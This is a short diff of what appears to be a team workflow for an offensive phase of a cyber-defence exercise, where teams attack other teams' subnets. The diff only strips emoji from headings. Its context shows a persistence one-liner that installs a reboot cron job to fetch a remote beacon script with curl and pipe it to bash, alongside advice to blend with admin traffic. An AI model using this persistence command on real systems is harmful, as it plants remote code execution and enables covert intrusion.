@@ -1,4 +1,4 @@
-🔵 Phase Two Workflow — Blue vs. Blue (Offense)
+Phase Two Workflow — Blue vs. Blue (Offense)
 1. Rules & Constraints
 Targets: Only other Blue Teams’ subnets (100.80.0.0/21, per team ranges).
 
@@ -112,7 +112,7 @@ Linux
 
 bash
 echo "@reboot /usr/bin/curl http://100.80.X.Y/beacon.sh | bash" | crontab -
-✅ Phase Two Mindset
+Phase Two Mindset
 Stealth over noise: blend with admin traffic.
 
 Service uptime first: don’t break scored services.
